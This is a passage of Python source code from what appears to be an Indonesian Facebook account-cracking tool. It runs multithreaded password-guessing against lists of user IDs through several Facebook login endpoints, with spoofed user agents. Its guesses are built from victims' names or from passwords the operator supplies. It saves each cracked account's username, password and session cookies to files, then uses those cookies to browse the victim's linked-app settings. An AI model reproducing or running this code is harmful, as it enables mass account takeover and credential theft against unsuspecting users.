					'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(ling)).group(1),
					'sec-ch-ua-mobile': '?1',
					'user-agent': user_agent,
					'sec-ch-ua': f'" Not A;Brand";v="99", "Chromium";v="{str(vers_client)}", "Google Chrome";v="{str(vers_client)}"',
					'sec-ch-ua-platform': f"{str(random.choice(plat_ch_ua))}",
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*', 
					'origin': 'https://'+url_log,
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty', 
					'referer': f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				}
				cook = ses.cookies.get_dict()
				po = ses.post(f"https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv&100",data=dataa,headers=sooz,cookies=cook,allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					romz = ses.cookies.get_dict()
					kukis = ";".join([key+"="+value for key, value in romz.items()])
					tree = Tree(" ")
					tree.add(f"{Te}{H}{user} ◊ {pw}")
					tree.add(f"{Te}{H}{kukis}")
					tree.add(f"{Te}{H}{user_agent}")
					tulis(tree)
					self.cek_apk(kukis)
					os.popen("play-audio data/dapet.mp3")
					sukses.append(f"{user} ◊ {pw} ◊ {kukis}")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis}\n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					tree = Tree(" ")
					tree.add(f"{Te}{K}{user} ◊ {pw}")
					tree.add(f"{Te}{K}{user_agent}")
					tulis(tree)
					os.popen("play-audio data/dapet.mp3")
					check.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
					
			lopev +=1
		except requests.exceptions.ConnectionError:
			time.sleep(6)
			self.Cracker(user, peweh, url_log)
		
#---------------------------------------------------------------------------------------------------------------#
#------ CRACK DENGAN USER AGENT SETTINGAN
#---------------------------------------------------------------------------------------------------------------#

	#--- MANUAL PASS
	def manualx(self): 
		global prog,des 
		tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} sayang{M},{O}pengen{M},{O}ngentod',style='#FF0022'))
		pwek = input('%s╰─%s password %s> %s'%(p,o,m,k))
		if pwek == '':
			exit('%s╰─%s jangan kosong'%(p,m))
		elif len(pwek)<=5:
			exit('%s╰─%s password minimal 6 karakter'%(p,m))
		else:
			pass 
		tulis(Panel(f""" {Te}{U}• {P}01{O} login{M} b-api{O} (cepat)\n {U}• {P}02{O} login{P} mbasic{O} (lambat)\n {U}• {P}03{O} login{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Login facebook {M}]',style='#FF0022'))
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_pepek()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid = akun.split('<=>')[0]
					pwx = pwek.split(",")
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Graphapi, uid, pwx, "graph.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Crackers, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Crackers, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
	
	#--- LANGSUNG
	def langsungx(self): 
		global prog,des 
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_pepek()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid, name = akun.split("<=>")
					na = name.split(' ')
					if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					else:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					if sluut in[""," "]:
						exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Graphapi, uid, pwx, "graph.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Crackers, uid, pwx,  "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Crackers, uid, pwx,  "m.facebook.com")
					else:
						exit("%s╰─%s isi yang benar "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
		
	#--- PASS GABUNGAN 
	def gabunganx(self): 
		global prog,des 
		tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} sayang{M},{O}pengen{M},{O}ngentod',style='#FF0022'))
		pwek = input('%s╰─%s password %s> %s'%(p,o,m,k))
		if pwek == '':
			exit('%s╰─%s jangan kosong'%(p,m))
		elif len(pwek)<=5:
			exit('%s╰─%s password minimal 6 karakter'%(p,m))
		else:
			pass 
		tulis(Panel(f""" {Te}{U}• {P}01{O} login{M} b-api{O} (cepat)\n {U}• {P}02{O} login{P} mbasic{O} (lambat)\n {U}• {P}03{O} login{H} mobile{O} (sangat lambat) {H}disarankan""",title = f'{Te}{M}[ {H}Login facebook {M}]',style='#FF0022'))
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		self.set_pepek()
		tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',style='#FF0022'))
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(self.id))
		with prog:
			with Romz_Xyz(max_workers=30) as titid:
				for akun in self.id:
					pwx = []
					uid, name = akun.split("<=>")
					na = name.split(' ')
					gb = pwek.split(',')
					if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
					else:
						pwx.append(name)
						pwx.append(na[0]+"123")
						pwx.append(na[0]+"12345")
						pwx.append(gb)
					if sluut in[""," "]:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
					elif sluut in ["1","01"]:
						titid.submit(self.Graphapi, uid, pwx, "graph.facebook.com")
					elif sluut in ["2","02"]: 
						titid.submit(self.Crackers, uid, pwx, "mbasic.facebook.com")
					elif sluut in ["3","03"]: 
						titid.submit(self.Crackers, uid, pwx, "m.facebook.com")
					else:
						exit("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
						
		selesai.hasil(sukses,check)
	
	#--- mentod m.fb & mbasic.fb
	def Crackers(self, user, peweh, url_log):
		try:
			global sukses,check,lopev
			prog.update(des,description=f'{Te}{P}async {H}[OK{M}:{H}{len(sukses)}]{O}-{K}[CP{M}:{K}{len(check)}] {O}{str(lopev)}{P}/{O}{len(self.id)}')
			prog.advance(des)
			for xyz_ in peweh:
				pw = xyz_.lower()
				ses = requests.Session()
				uas = open('ugent.txt','r').read()
				#ses.headers.update({"Host": f"{url_log}","upgrade-insecure-requests": "1","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest", "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				ling = ses.get(f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text 
				dataa ={
					'lsd':re.search('name="lsd" value="(.*?)"', str(ling)).group(1),
					'jazoest':re.search('name="jazoest" value="(.*?)"', str(ling)).group(1),
					'm_ts': re.search('name="m_ts" value="(.*?)"',str(ling)).group(1),
					'li': re.search('name="li" value="(.*?)"',str(ling)).group(1),
					'try_number': re.search('name="try_number" value="(.*?)"',str(ling)).group(1),
					'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(ling)).group(1),
					"email":user,"pass":pw,
					'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 
					'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(ling)).group(1),
					'_fb_noscript': re.search('name="_fb_noscript" value="(.*?)"',str(ling)).group(1)
				}
				sooz ={
					'Host': url_log,
					'content-length': f"{len(str(dataa))}",
					'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(ling)).group(1),
					'user-agent': uas,
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*', 
					'origin': 'https://'+url_log,
					'x-requested-with': 'XMLHttpRequest',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty', 
					'referer': f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				}
				cook = ses.cookies.get_dict()
				po = ses.post(f"https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv&100",data=dataa,headers=sooz,cookies=cook,allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					romz = ses.cookies.get_dict()
					kukis = ";".join([key+"="+value for key, value in romz.items()])
					tree = Tree(" ")
					tree.add(f"{Te}{H}{user} ◊ {pw}")
					tree.add(f"{Te}{H}{kukis}")
					tree.add(f"{Te}{H}{uas}")
					tulis(tree)
					self.cek_apk(kukis)
					os.popen("play-audio data/dapet.mp3")
					sukses.append(f"{user} ◊ {pw} ◊ {kukis}")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis}\n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					tree = Tree(" ")
					tree.add(f"{Te}{K}{user} ◊ {pw}")
					tree.add(f"{Te}{K}{uas}")
					tulis(tree)
					os.popen("play-audio data/dapet.mp3")
					check.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
					
			lopev +=1
		except requests.exceptions.ConnectionError:
			time.sleep(6)
			self.Crackers(user, peweh, url_log)
		
	#--- CEK APLIKASI 
	def cek_apk(self,kukis):
		if "okeh" in self.appk:
			kont = requests.Session()
			#--- aplikasi aktif 
			w=kont.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text 
			sop = bs4.BeautifulSoup(w,"html.parser")
			x = sop.find("form",method="post")
			game = [i.text for i in x.find_all("h3")]
			try:
				for i in range(len(game)):
					print ("\r     %s└─ %s. %s%s"%(p,i+1,o,game[i].replace("Added on"," Added on")))
			except AttributeError:
				print ("\r     %s└─ %sgagal mengecek game"%(p,m))
			#--- aplikasi kedaluwarsa 
			w=kont.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text 
			sop = bs4.BeautifulSoup(w,"html.parser")
			x = sop.find("form",method="post")
			game = [i.text for i in x.find_all("h3")]
			try:
				for i in range(len(game)):
					print ("\r     %s└─ %s. %s%s"%(p,i+1,o,game[i].replace("Added on"," Added on")))
			except AttributeError:
				print ("\r     %s└─ %sgagal mengecek game"%(p,m))
			#--- aplikasi terhapus 
			w=kont.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",cookies={"cookie":"noscript=1;"+kukis}).text 
			sop = bs4.BeautifulSoup(w,"html.parser")
			x = sop.find("form",method="post")
			game = [i.text for i in x.find_all("h3")]
			try:
				for i in range(len(game)):
					print ("\r     %s└─ %s. %s%s"%(p,i+1,j,game[i].replace("Dihapus"," Dihapus")))
			except:
				pass 
		else:
			pass
			